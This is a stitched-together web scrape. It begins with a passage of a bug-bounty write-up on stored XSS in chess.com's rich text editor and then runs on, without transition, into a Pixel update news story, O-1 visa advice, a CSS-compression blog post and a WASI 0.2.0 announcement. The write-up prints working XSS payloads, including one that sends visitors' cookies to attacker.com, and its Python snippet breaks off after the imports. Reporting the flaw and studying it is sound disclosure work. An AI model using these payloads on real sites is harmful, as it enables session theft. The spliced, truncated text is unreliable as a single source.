auto; background-image: url(https://images.chesscomfiles.com/?/onload='x=2;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-8.png" alt="" loading="lazy" width="389" height="47"></figure><p>Using an <code>‘</code> in our payload messes up the JS (encoded to <code>%27</code>) and throws a syntax error. I had to do a bit of thinking here, but after a while, I realised that <code>%27</code> could also be interpreted as the end part of a modulus operation...maybe I could get the browser to execute that operation and then carry out the variable assignment. Here's the payload I came up with:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4';x=2;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-9.png" alt="" loading="lazy" width="364" height="42"></figure><p><strong>RESULT!</strong> Now we're getting somewhere. Let's see if we can modify some inbuilt variables (like <code>document.cookie</code>) to a string instead. This might be a pain because all the usual ways of defining a new string utilise quotes or backticks that are unfortunately filtered out. </p><p>Time to do some googling. After a bit of rummaging around on StackOverflow, I came across this comment:</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-10.png" alt="" loading="lazy" width="570" height="35"></figure><p>So it turns out you can define a regex and then get the string from the <code>source</code> attribute! Let's incorporate this into our payload and try to overwrite the <code>PHPSESSID</code> cookie. (Thank you, Frobinsonj!)</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4';document.cookie=/PHPSESSID=invalid /.source;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-11.png" alt="" loading="lazy" width="1021" height="101" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-11.png 600w, https://skii.dev/content/images/size/w1000/2024/01/Untitled-11.png 1000w, https://skii.dev/content/images/2024/01/Untitled-11.png 1021w" sizes="(min-width: 720px) 720px"></figure><p>Overwriting the cookies is cool, but we want to extract the currently set ones for a more significant impact. We can try to set the document and location variables to redirect the user to a site we own, adding on the cookies as parameters, but the problem is we can't use the <code>?</code> Symbol, as mentioned earlier.</p><p>Okay, so maybe not as a parameter - but there are other ways to include data in the URL - for example, by setting it in the path. Something like <code>http:attacker.com/sensitivedata</code> requires the use of a <code>/</code>, but unfortunately, we already use that to format the whole URL as a string via the regex trick.</p><p>However, who said we need to enter the <code>/</code> character manually? It's used all the time for directory paths, so there must already be a JavaScript variable with it included that we can tack onto! In this case, I quickly found <code>location.pathname</code></p><figure><img src="https://skii.dev/content/images/2024/01/image-14.png" alt="" loading="lazy" width="183" height="43"></figure><p>Here's the final payload:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4';document.location=/http:attacker.com/.source+location.pathname+document.cookie;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/image-15.png" alt="" loading="lazy" width="1180" height="386" srcset="https://skii.dev/content/images/size/w600/2024/01/image-15.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-15.png 1000w, https://skii.dev/content/images/2024/01/image-15.png 1180w"></figure><p>Nice. So I can extract cookies without <em>HttpOnly</em><strong> </strong>or any other stored JavaScript objects. I pulled some sensitive account data and reported it to the security team. </p><p>Having managed to get this far, I felt pretty proud, but I'm always up for a challenge and enjoy pushing myself, so I wanted to try to get full XSS. I pondered for a couple of days about how I could achieve this. </p><p>Let's return to the original issue of using <code>url()</code> in the <code>background-image</code> style that immediately closes the attribute with the URL leftover to be added as unfiltered attributes. What if we move the <code>url()</code> part to another, more direct attribute like <code>srcset</code> instead of using it in style? It'd be a long shot, but it might be treated slightly differently and thus let us use more symbols for a broader syntax of JS, leading to full XSS! Here's what I came up with:</p><pre><code>&lt;p&gt;&lt;img src="a.png" style="display: block; margin: 0 auto;" srcset=url(https://images.chesscomfiles.com/onerror=eval(atob("YWxlcnQoMSk=)));2+4//&gt;&lt;/p&gt;</code></pre><p>As you can see, this doesn't require a <code>?</code> to be used, and the <code>(</code>, <code>"</code> symbols are not encoded, meaning we can base64 any payload and directly execute that! Whoo! </p><figure><img src="https://skii.dev/content/images/2024/01/image-16.png" alt="" loading="lazy" width="454" height="156"></figure><p>To top it all off, I quickly learned that the TinyMCE rich text editor system was used not only in your profile's <code>About Me</code> page but practically everywhere on the site, including comments in forums and blogs! This had a significant impact because thousands of users used the comments and blogs daily. </p><p>I hope you enjoyed reading this as much as I did finding this intriguing bug! In the end, it turned out that the ability for XSS was already known (this is pretty common in bug bounties). Still, my initial vector through the background-image attribute was not known to them, and they thoroughly enjoyed reading my detailed report, offering me a bonus reward for it.</p><div data-kg-toggle-state="close">

                <h4><span>Aside: How I accidentally triggered blind XSS</span></h4>
                </div>
            <div><p><span>During communication with the triage team at chess.com about the initial OSRF vulnerability, they asked me how I managed to execute XSS (an alert had popped up while viewing my profile) - I was confused because, at that time, I couldn't get any injection possible and had no idea where they got that from. Maybe it was another hacker who also got fed up with losing!</span></p><p><span>It turned out that when viewing my profile, the staff team could roll back previous versions to view - loading these previous versions did not filter out malicious HTML from my input. Thus, when I was trying for XSS, the malicious payload was saved as an earlier version and executed as soon as the staff member viewied it!</span></p></div>
        </div><hr><p>The root issue behind these vulnerabilities is the re-uploading image function. Firstly, its checking system to see if the image was hosted on chess.com can easily be tricked by including chess.com in the domain name. Instead, it should check if the <strong>root </strong>domain is equal to <code>chess.com</code> or, even better, re-upload the image to its posting CDN no matter what the source is.</p><p>Rich text editors are a gold mine for achieving XSS because they allow different HTML elements for a more stylish appearance. Instead of accepting input and treating it only <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html?ref=skii.dev#safe-sinks" rel="noreferrer">as text</a>, it has to get raw HTML and directly embed it - this is why configuring allow-lists for what elements &amp; attributes can be taken is so important, as well as ensuring the RTE is always up-to-date. </p><p>However, in this case, TinyMCE was up-to-date and had been configured correctly not to allow scripting tags and attributes. The problem was that when we inputted the code for our profile, it firstly sanitised it (good), but it did this before it ran extra code on it, such as the re-uploading function - this led to the final HTML being completely different and not going through sanitisation to recheck it. </p><p>If <code>chess.com</code> wants to keep RTE, it should ensure that the sanitisation is run directly on the final HTML shown to the user. Even though the HTML modification was caused by the re-uploading function modifying the URL, and <em>technically </em>fixing that would stop this specific attack vector, another function may do something similar. Hence, it's essential to fix the sanitisation directly! (Defense in depth)</p><p>Finally, here are some extra details about the findings:</p><ol><li>If you're wondering why I didn't just use <code>friend.chess.com</code> directly for the OSRF exploit, during my testing of this, chess.com changed something to do with how it functioned, and I could only get <code>chess.com/registration-invite</code> to work...</li><li>Google did not like me setting up a <code>chess.com</code> subdomain, and a couple of weeks later, my domain got flagged for "phishing." - I had to contact them to explain and manually remove it as it affected my whole domain. </li><li>During the data extraction stage, where I couldn't exfil the data as a parameter, I realised I could have instead set the data as a subdomain like <code>http:sensitivedata.attacker.com</code> . This is possible using a multi-level wildcard (catch-all) DNS system with something like a Cloudflare worker to log the subdomain requested. This, however, would be more complicated to set up, and I haven't dug too deep into it.</li><li>Alternatively, instead of using Burp to intercept and send the raw data in the <code>About</code> section rich text editor, you could also manually send the POST request using a scripting language like <code>Python</code></li></ol><pre><code>import requests, os
import urllib3

<div id="readability-page-1" class="page"><div>
<p><img alt="Google Pixel 7" height="900" src="https://www.bleepstatic.com/content/hl-images/2024/01/24/google-pixel-7.jpg" width="1600"></p>
<p>Google Pixel smartphone&nbsp;owners report problems after installing the January 2024 Google Play system update, being unable to access their devices internal storage, open the camera, take screenshots, or even open apps.</p>
<p>The issue is being&nbsp;<a href="https://www.reddit.com/r/GooglePixel/comments/19c14at/upixelcommunity_please_help_internal_storage/" target="_blank" rel="nofollow noopener">reported</a>&nbsp;by owners of numerous Pixel models, including the Google Pixel 5, 6, 6a, 7, 7a, 8, and 8 Pro, suggesting that it isn't confined to a particular hardware architecture.</p>
<p>The root cause is unknown but is likely a software issue with the January 2024 Play system update that Google hasn't pinpointed or fixed yet.</p>
<p>Most proposed solutions coming from affected users don't address the problem, with some reporting solving it by performing a factory reset, in which case, all data is lost.</p>
<p>However, these recommendations are coming from impacted Google Pixel owners rather than Google themselves, who&nbsp;<a href="http://www.reddit.com/r/GooglePixel/comments/19c14at/comment/kj83bb0/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3" target="_blank" rel="nofollow noopener">simply acknowledged</a>&nbsp;they are aware of and looking into the issue.</p>
<p>"I wonder why this is not something that's getting blown up forcing Google for a fix. Spending so much money on a phone just to be made unusable by an update is very aggravating,"&nbsp;<a href="http://support.google.com/pixelphone/thread/254021673?hl=en&amp;msgid=254925930" target="_blank" rel="nofollow noopener">an affected owner posted</a>&nbsp;in Google's Pixel Phone support forums.</p>
<p>Google Play system updates are separate from the monthly security patches, both accessible via Settings &gt; Security &amp; privacy &gt; System &amp; updates.</p>
<p><img alt="Update menu" height="600" src="https://www.bleepstatic.com/images/news/u/1220909/2024/Android/play-update.png" width="360"></p>
<p>Google introduced Play system updates in Android 10 as a way to deliver crucial security updates and system component enhancements and protections in devices not running the latest patch level and those that have reached the end of support by the OEM.</p>
<p>They are served directly by Google, bypassing the OEM update channels, and are effective in keeping older Android versions compatible with modern apps and Google services, and also relatively safe.</p>
<p>In the case of Pixels, it appears that Google performed a staged roll-out of the January 2024 Play system updates, so not every Pixel owner has received the problematic update yet.</p>
<p>If you are still on an older update (last was November 1, 2023), it is recommended to stay on it and postpone applying the January 2024 update until the situation clears up.</p>
<p>BleepingComputer has contacted Google for a comment on the reported problems and their plans to address them, and a member of the firm's press team has sent us the following:</p>
<blockquote>
<p>We are aware of this issue, and are looking into it. - Google</p>
</blockquote>
<h2>Same thing happened a few months back</h2>
<p>Although the nature of the current problem has not been confirmed yet, memory bugs introduced by a Play system update previously rendered Pixel devices completely unusable in October 2023.</p>
<p>Google eventually&nbsp;<a href="https://support.google.com/pixelphone/thread/241474288/issues-accessing-storage-after-updating-to-android-14?hl=en&amp;sjid=15384693003212063525-EU" target="_blank" rel="nofollow noopener">addressed</a>&nbsp;the media storage access and repeated rebooting problems by releasing an update on November 7, 2023. However, by then, many users had already resorted to performing a factory reset, losing their data as a result.</p>
<p>The recurrence of this type of issue in such a short timeframe is quite concerning for Pixel device users, who cannot use the features of their phones.</p>
<p>The situation undermines the trust in Google's quality assurance processes and raises concerns about the rigor of the tech giant's validation and testing protocols before deploying a system update.</p>

I met the 4 criteria which are highlighted in <strong>bold (*)</strong> below.</p><ul><li><strong>Nationally or internationally recognized awards (*)</strong></li><li>Membership in organizations which require outstanding achievement</li><li>Published material in journals, trade publications or major media about the applicant</li><li>Has judged the work of others (e.g. peer-review, or judging hackathons)</li><li><strong>Evidence of original contributions in science, scholarship, or business (*)</strong></li><li>Has authored / published articles in professional journals, or major media</li><li><strong>Has been employed in a ‘critical capacity’ at an organization with a distinguished reputation (*)</strong></li><li><strong>Evidence that the beneficiary has commanded a high salary (*)</strong></li></ul><p>Below are more details on how I met each of the criteria. In general, for every claim made in your O-1 cover letter, you should be able to produce documentary evidence, or a statement in a signed letter from a credible person.</p><p><strong>Nationally or internationally recognized awards</strong></p><p>Startup funding counts as an award, if you can demonstrate that the investor(s) were being judicious in their investment. In other words, you must demonstrate that your investors only select a small percentage of the opportunities presented to them.</p><p>At the time of my application, my company had raised $98,000 on SAFEs from friends, family and angel investors. Alongside copies of all the signed SAFEs (demonstrating total funding amount), we submitted our pitch deck, and letters + CVs from two investors showing their credibility as discerning / selective individuals.</p><p><strong>Evidence of original contributions in science, scholarship, or business</strong></p><p>I did not have to do any additional work, beyond the day-to-day work I had done at Wave in order to meet this criterion.</p><p>While at Wave, I worked on several projects that were original in the industry, primarily because Wave had unique constraints as a fintech targeting sub-Saharan Africa. It helped that I had previously met the L1-B criterion for “specialized knowledge” and we were able to make a similar argument here that I had worked on original, proprietary software at Wave.</p><p>As evidence, we included my employment contract, letters from the CTO and a cofounder of Wave, and press coverage showing <a href="https://techcrunch.com/2021/09/06/sequoia-heritage-stripe-and-others-invest-200m-in-african-fintech-wave-at-1-7b-valuation/?ref=blog.awais.io"><u>Wave’s success in Africa</u></a>. We also included material from a conference talk I gave at PyCon Africa in June 2019.</p><p><strong>Being employed in a ‘critical capacity’ at an organization with a distinguished reputation</strong></p><p>It’s important for this criterion to show both <em>critical capacity</em>, and <em>distinguished reputation</em>. My lawyer made the argument that I met this criteria both for my work at Path, and my work at Wave.</p><p>At the new startup, Path, it was easy to show critical capacity since I was a founder, large shareholder, and board member, as evidenced by our incorporation documents. To demonstrate distinguished reputation, we showed that Path had raised nearly $100,000 in funding, and that Path had been accepted into a legal tech sandbox program.</p><p>To demonstrate critical capacity at Wave, we used the same two letters: one from Wave’s CTO and one from Wave’s cofounder showing that I was an early employee and had worked on key projects which contributed significantly to Wave’s success. To show distinguished reputation we submitted media coverage about Wave’s impressive <a href="https://randle.substack.com/p/wave?ref=blog.awais.io"><u>$200m Series A fundraise</u></a>.</p><p><strong>Evidence that the beneficiary has commanded a high salary or remuneration</strong></p><p>Equity grants in startups count towards this requirement.</p><blockquote><em>“if the petitioner demonstrates that receipt of a high salary is not readily applicable to the beneficiary’s position as an entrepreneur, the petitioner might present evidence that the beneficiary’s highly valued equity holdings in the startup are of comparable significance to the high salary criterion.”<br>- </em><a href="https://www.uscis.gov/policy-manual/volume-2-part-m-chapter-4?ref=blog.awais.io#S-C-3"><em><u>USCIS Policy Manual. Volume 2, Part M, Chapter 5, Section 3</u></em></a></blockquote><p>I showed that my total compensation (base salary + equity) at Wave for the 2021 calendar year was higher than the top 10th percentile for software engineers in New York City as recorded by the <a href="https://www.bls.gov/oes/current/oes151252.htm?ref=blog.awais.io"><u>US Bureau of Labor Statistics</u></a> benchmark, and the <a href="https://www.careeronestop.org/Toolkit/Wages/find-salary.aspx?keyword=Software+Developers&amp;soccode=151252&amp;location=New+York&amp;keywordSearched=Software+Developers&amp;ref=blog.awais.io"><u>Career One Stop</u></a> website.</p><p>I benefited from the frothy investment market of 2021. The stock options I was granted at Wave were issued before Wave raised money at a $1.7B valuation, so they were worth a lot on paper at the time of my O-1 application.

<div id="readability-page-1" class="page"><div><h2 id="what">What</h2><p>Late last year, I had an idea that’s been steadily brewing in my head. I’ve found myself with some free time recently (it coincided with vacation, go figure), and I’ve hacked together some proof-of-concept code. Whether or not it is actually proving the concept I’m not sure, but the results are somewhat interesting, and I believe the idea is novel (I haven’t found any other implementation in the wild). So it’s at least worthy of a blog post.</p><p>I wrote <code>cssfact</code>, a lossy CSS compressor. That is, a program that takes some CSS and outputs back some other CSS that hopefully retains some (most) of the information in the input, but contains fewer rules than the original. Exactly how many rules it produces is configurable, and the loss depends on that number.</p><p>The program only works on style rules (which make up the majority of a typical CSS). It leaves the non-style rules unchanged.</p><p><a href="https://github.com/nathell/cssfact">Here’s the source</a>. It’s not exactly straightforward to get it running, but it shouldn’t be very hard, either. It’s very simple – the program itself doesn’t contain any fancy logic; the actual decisions on what the output will contain are made by an external program.</p><p>If you just want to see some results, here is a sample with <a href="https://danieljanus.pl/">my homepage</a> serving as a patient etherized upon a table. Its CSS is quite small – 55 style rules that cssfact can work on – and here’s how the page looks with various settings:</p><ul><li><span>Original: <a href="https://danieljanus.pl/">page</a>, <a href="https://danieljanus.pl/css/nhp.css">CSS</a>, <a href="https://github.com/nathell/nhp/blob/master/src/sass/nhp.sass">source SASS</a></span></li><li><span>1 style rule: <a href="https://danieljanus.pl/index1.html">page</a>, <a href="https://danieljanus.pl/css/nhp1.css">CSS</a> (93% information loss)</span></li><li><span>5 style rules: <a href="https://danieljanus.pl/index5.html">page</a>, <a href="https://danieljanus.pl/css/nhp5.css">CSS</a> (74% information loss)</span></li><li><span>10 style rules: <a href="https://danieljanus.pl/index10.html">page</a>, <a href="https://danieljanus.pl/css/nhp10.css">CSS</a> (55% information loss)</span></li><li><span>20 style rules: <a href="https://danieljanus.pl/index20.html">page</a>, <a href="https://danieljanus.pl/css/nhp20.css">CSS</a> (31% information loss)</span></li><li><span>30 style rules: <a href="https://danieljanus.pl/index30.html">page</a>, <a href="https://danieljanus.pl/css/nhp30.css">CSS</a> (17% information loss)</span></li></ul><p>My homepage and both of my blogs all use the same CSS, so you can try to replace the CSS in your browser’s devtools elsewhere on the site and see how it looks.</p><h2 id="how">How</h2><p>Three words: <a href="https://cs.uef.fi/~pauli/bmf_tutorial/material.html">binary matrix factorization</a> (BMF, in the Boolean algebra).</p><p>I guess I could just stop here, but I’ll elaborate just in case it isn’t clear.</p><p>Consider a simple CSS snippet:</p><pre><code><span>h1</span>, <span>h2</span> {
   <span>padding</span>: <span>0</span>;
   <span>margin-bottom</span>: <span>0.5em</span>;
}

<span>h1</span> {
   <span>font-size</span>: <span>32px</span>;
   <span>font-weight</span>: bold;
}

<span>h2</span> {
   <span>font-size</span>: <span>24px</span>;
   <span>font-weight</span>: bold;
}
</code></pre><p>The first rule tells you that for all elements that match either the <code>h1</code> or <code>h2</code> selectors, the two declarations should apply.</p><p>You could visualize this CSS as a 5x2 binary matrix <i>A<sup>T</sup></i> where the <em>n</em> columns correspond to simple selectors (i.e., without commas in them) and the <em>m</em> rows correspond to declarations:</p>
<table>
        <tbody><tr><th></th><th><code>h1</code></th><th><code>h2</code></th></tr>
        <tr><th><code>padding: 0</code></th><td>1</td><td>1</td></tr>
        <tr><th><code>margin-bottom: 0.5em</code></th><td>1</td><td>1</td></tr>
        <tr><th><code>font-size: 32px</code></th><td>1</td><td>0</td></tr>
        <tr><th><code>font-size: 24px</code></th><td>0</td><td>1</td></tr>
        <tr><th><code>font-weight: bold</code></th><td>1</td><td>1</td></tr>
    </tbody>
</table>
<p>You could also transpose the matrix, yielding <em>A</em> with <em>m</em> rows denoting selectors and <em>n</em> columns denoting declarations. For my homepage’s CSS, <em>m</em> = 60 and <em>n</em> = 81; for bigger stylesheets, several thousand in either direction is not uncommon.</p><p>Now, linear algebra gives us algorithms to find a matrix <em>A′ ≈ A</em> such that there exists a decomposition <em>A′ = B × C</em>, where <em>B</em> has dimensions <em>m × r</em>, <em>C</em> has dimensions <em>r × n</em>, and <em>r</em> is small – typically much smaller than <em>m</em> or <em>n</em>. So this is a way of dimensionality reduction.</p><p>In the usual algebra of real numbers, there’s no guarantee that <em>B</em> or <em>C</em> will themselves be binary matrices – in fact, most likely they won’t. But if we operate in Boolean algebra instead (i.e. one where 1 + 1 = 1), then both <em>B</em> and <em>C</em> will be binary. The flip side is that the Boolean BMF problem is NP-hard, so the algorithms found in the wild perform approximate decompositions, not guaranteed to be optimal.</p><p>But that’s okay, because lossiness is inherent in what we’re doing anyway, and it turns the binary matrices <em>B</em> and <em>C</em> are readily interpretable. Look again at the CSS matrix above: why is there a 1 in the top-left cell? Because at least one of the CSS rules stipulates the declaration <code>padding: 0</code> for the selector <code>h1</code>.</p><p>This is exactly the definition of matrix multiplication in the Boolean algebra. The matrix <em>A′</em> will have a 1 at coordinates [<em>i, j</em>] iff there is at least one <em>k</em> ∈ {1, …, <em>r</em>} such that <em>B</em>[<em>i</em>, <em>k</em>] = 1 and <em>C</em>[<em>k</em>, <em>j</em>] = 1. So the columns of <em>B</em> and rows of <em>C</em> actually correspond to CSS rules! Every time you write CSS, you’re actually writing out binary matrices – and the browser is multiplying them to get at the actual behaviour.</p><p>Well, not really, but it’s one way to think about it. It’s not perfect – it completely glosses over rules overlapping each other and having precedence, and treats them as equally important – but it somewhat works!</p><p>You could plug in any BMF algorithm to this approach. For cssfact, I’ve picked the code by <a href="https://github.com/IBM/binary-matrix-factorization/">Barahona and Goncalves 2019</a> – sadly, I wasn’t able to find the actual paper – not because it performs spectacularly well (it’s actually dog-slow on larger stylesheets), but because I was easily able to make it work and interface with it.</p><h2 id="why">Why</h2><p>Why not?</p><p>The sheer joy of exploration is reason enough, but I believe there are potential practical applications. CSS codebases have the tendency to grow organically and eventually start collapsing under their own weight, and they have to be maintained very thoughtfully to prevent that. In many CSS monstrosities found in the wild, there are much cleaner, leaner, essence-capturing cores struggling to get out.</p><p>This tool probably won’t automatically extract them for you – so don’t put it in your CI pipeline – but by perusing the CSS that it produces and cross-checking it with the input, you could encounter hints on what redundancy there is in your styles. Things like “these components are actually very similar, so maybe should be united” may become more apparent.</p></div></div>]]></description>

<div id="readability-page-1" class="page"><div id="__blog-post-container" itemprop="articleBody"><p><img loading="lazy" alt="stable foundation and community" src="https://wasmcloud.com/assets/images/stable-foundation-c2f80e43b4d8ae40b2d7e625453e70cd.png" width="1792" height="1024"></p>
<p><a href="https://github.com/WebAssembly/WASI/pull/577" target="_blank" rel="noopener noreferrer">WASI Preview 2 officially launched!</a> After a vote in the WASI Subgroup of the W3C WebAssembly Community Group, the standard set of interfaces included in the launch of Preview 2, aka WASI 0.2.0, is ready for use by library implementers. We've been closely tracking the different release candidates of WASI 0.2.0 over the last 6 months, and wasmCloud will update its runtime WIT definitions to the pinned versions in just a few days.</p>
<!-- -->
<p>If you look in our <a href="https://wasmcloud.com/docs/tour/hello-world" target="_blank" rel="noopener noreferrer">quickstart</a> now you'll notice that we now provide documentation for building WebAssembly components, starting with Rust and TinyGo. As seen in previous <a href="https://wasmcloud.com/community" target="_blank" rel="noopener noreferrer">community calls</a>, JavaScript and Python are also supported thanks to the <a href="https://github.com/bytecodealliance/componentizejs/" target="_blank" rel="noopener noreferrer">ComponentizeJS</a> and <a href="https://github.com/bytecodealliance/componentize-py" target="_blank" rel="noopener noreferrer">componentize-py</a> projects. I worked on getting examples up-and-running for components, and there are upsides and downsides to the initial approach we're taking. This post will focus on what current component support looks like and what WASI 0.2.0 means for wasmCloud.</p>
<h2 id="the-hello-world-of-wasi">The Hello World of WASI<!-- -->:HTTP<a href="#the-hello-world-of-wasi" aria-label="Direct link to the-hello-world-of-wasi" title="Direct link to the-hello-world-of-wasi">​</a></h2>
<p>A WebAssembly component is a reactive unit of compute that has to be loaded, instantiated, and then a function that the component <strong>export</strong>s needs to be <strong>import</strong>ed by the host runtime. Like so many applications, the entrypoint for many of our examples is an HTTP endpoint as it provides a common abstraction that's easy to work with and test using <code>curl</code> on the CLI.</p>
<p>The simplest “hello world” example looks like this using the <code>wasi:http</code> interface:</p>
<div><pre tabindex="0"><code><span><span># </span><span>Rust</span><span></span><br></span><span><span></span><span>wit_bindgen</span><span>::</span><span>generate!</span><span>(</span><span>{</span><span></span><br></span><span><span>    world</span><span>:</span><span> </span><span>"hello"</span><span>,</span><span></span><br></span><span><span>    exports</span><span>:</span><span> </span><span>{</span><span></span><br></span><span><span>        </span><span>"wasi:http/incoming-handler"</span><span>:</span><span> </span><span>HttpServer</span><span>,</span><span></span><br></span><span><span>    </span><span>}</span><span>,</span><span></span><br></span><span><span></span><span>}</span><span>)</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>use</span><span> </span><span>exports</span><span>::</span><span>wasi</span><span>::</span><span>http</span><span>::</span><span>incoming_handler</span><span>::</span><span>Guest</span><span>;</span><span></span><br></span><span><span></span><span>use</span><span> </span><span>wasi</span><span>::</span><span>http</span><span>::</span><span>types</span><span>::</span><span>*</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>struct</span><span> </span><span>HttpServer</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>impl</span><span> </span><span>Guest</span><span> </span><span>for</span><span> </span><span>HttpServer</span><span> </span><span>{</span><span></span><br></span><span><span>    </span><span>fn</span><span> </span><span>handle</span><span>(</span><span>_request</span><span>:</span><span> </span><span>IncomingRequest</span><span>,</span><span> response_out</span><span>:</span><span> </span><span>ResponseOutparam</span><span>)</span><span> </span><span>{</span><span></span><br></span><span><span>        </span><span>let</span><span> response </span><span>=</span><span> </span><span>OutgoingResponse</span><span>::</span><span>new</span><span>(</span><span>Fields</span><span>::</span><span>new</span><span>(</span><span>)</span><span>)</span><span>;</span><span></span><br></span><span><span>        response</span><span>.</span><span>set_status_code</span><span>(</span><span>200</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>        </span><span>let</span><span> response_body </span><span>=</span><span> response</span><span>.</span><span>body</span><span>(</span><span>)</span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>        response_body</span><br></span><span><span>            </span><span>.</span><span>write</span><span>(</span><span>)</span><span></span><br></span><span><span>            </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span></span><br></span><span><span>            </span><span>.</span><span>blocking_write_and_flush</span><span>(</span><span>b"Hello from Rust!\n"</span><span>)</span><span></span><br></span><span><span>            </span><span>.</span><span>unwrap</span><span>(</span><span>)</span><span>;</span><span></span><br></span><span><span>        </span><span>OutgoingBody</span><span>::</span><span>finish</span><span>(</span><span>response_body</span><span>,</span><span> </span><span>None</span><span>)</span><span>.</span><span>expect</span><span>(</span><span>"failed to finish response body"</span><span>)</span><span>;</span><span></span><br></span><span><span>        </span><span>ResponseOutparam</span><span>::</span><span>set</span><span>(</span><span>response_out</span><span>,</span><span> </span><span>Ok</span><span>(</span><span>response</span><span>)</span><span>)</span><span>;</span><span></span><br></span><span><span>    </span><span>}</span><span></span><br></span><span><span></span><span>}</span><br></span></code></pre></div>
<p>In our <code>Cargo.toml</code>, the only dependency here is <code>wit-bindgen</code> to generate the Rust types for us to refer to from <code>wasi::http::*</code>. This is lower level than the Smithy module abstraction, which provides a simple model of receiving an HTTP request struct and returning a response struct:</p>
<div><pre tabindex="0"><code><span><span>async</span><span> </span><span>fn</span><span> </span><span>handle_request</span><span>(</span><span>&amp;</span><span>self</span><span>,</span><span> _ctx</span><span>:</span><span> </span><span>&amp;</span><span>Context</span><span>,</span><span> _req</span><span>:</span><span> </span><span>&amp;</span><span>HttpRequest</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>RpcResult</span><span>&lt;</span><span>HttpResponse</span><span>&gt;</span><span> </span><span>{</span><span></span><br></span><span><span>    </span><span>Ok</span><span>(</span><span>HttpResponse</span><span>::</span><span>ok</span><span>(</span><span>"Hello, World!"</span><span>)</span><span>)</span><span></span><br></span><span><span></span><span>}</span><br></span></code></pre></div>
<p>At this point, looking at the above examples, you may consider the component experience to be more WebAssembly-specific than code you'd ideally like to write. This is true, as the base level of support for Wasm components starts with using the <code>wit-bindgen</code> generated types and functions to implement business logic. So, what's the path forward?</p>
<h2 id="why-wasi-020-is-important">Why WASI 0.2.0 is Important<a href="#why-wasi-020-is-important" aria-label="Direct link to Why WASI 0.2.0 is Important" title="Direct link to Why WASI 0.2.0 is Important">​</a></h2>
<p>Working with the standard set of WASI interfaces isn't meant for application developers. They are fundamentally lower levels of abstraction meant for library developers and implementers. WASI 0.2.0 is important not because it gives application developers the ability to write real things with WebAssembly (we've been doing that for four years!), but because it provides a stable definition of common interfaces for library developers in each language to build on top of.</p>
<p>Taking the example above, we're not working towards a world where developers need to work with WebAssembly interfaces, we're working towards a world where the capabilities of standard libraries of language ecosystems will support WASI interfaces. Developers using language standard libraries and popular libraries will likely not code directly to WASI API's and will instead use idiomatic abstractions. As WASI grows on the 0.2 foundation, higher-level interfaces like wasi-keyvalue may be at the forefront. Let me show you an example of the ideal Wasm hello world application to tie what I'm saying together in a concrete way:</p>
<div><pre tabindex="0"><code><span><span>#[macro_use]</span><span> </span><span>extern</span><span> </span><span>crate</span><span> </span><span>rocket</span><span>;</span><span></span><br></span><span><span></span><br></span><span><span></span><span>#[get(</span><span>"/hello/&lt;name&gt;"</span><span>)]</span><span></span><br></span><span><span></span><span>fn</span><span> </span><span>hello</span><span>(</span><span>name</span><span>:</span><span> </span><span>&amp;</span><span>str</span><span>)</span><span> </span><span>-&gt;</span><span> </span><span>String</span><span> </span><span>{</span><span></span><br></span><span><span>    </span><span>format!</span><span>(</span><span>"Hello, {name}!"</span><span>)</span><span></span><br></span><span><span></span><span>}</span><span></span><br></span><span><span></span><br></span><span><span></span><span>#[launch]</span><span></span><br></span><span><span></span><span>fn</span><span> </span><span>rocket</span><span>(</span><span>)</span><span> </span><span>-&gt;</span><span> _ </span><span>{</span><span></span><br></span><span><span>    </span><span>rocket</span><span>::</span><span>build</span><span>(</span><span>)</span><span>.</span><span>mount</span><span>(</span><span>"/"</span><span>,</span><span> </span><span>routes!</span><span>[</span><span>hello</span><span>]</span><span>)</span><span></span><br></span><span><span></span><span>}</span><br></span></code></pre></div>
<p>Note that there are no Wasm interfaces here! This is actually copy/pasted from the <a href="https://rocket.rs/v0.4/" target="_blank" rel="noopener noreferrer">Rocket homepage</a>. The ideal experience is that developers can use idiomatic community and standard libraries to write their code, then simply compile to a Wasm binary. We're not quite at this point yet, but WASI 0.2.0 is the first step in this direction because it provides a common standard set of interfaces for library developers to build on top of.</p>

<p>If you take a look at our <a href="https://github.com/wasmCloud/wasmCloud/tree/main/examples" target="_blank" rel="noopener noreferrer">examples in the wasmCloud/wasmCloud repository</a> you'll see we've added Rust, TinyGo and TypeScript/JavaScript examples, with Python coming soon. The above snippet of code, where a developer can use just a language library out-of-the-box and compile to WASI, is likely a few months away. The important thing to keep in mind is that WASI 0.2.0 enables this in the first place and, looking forward, here's what you can expect from the wasmCloud developer experience.</p>
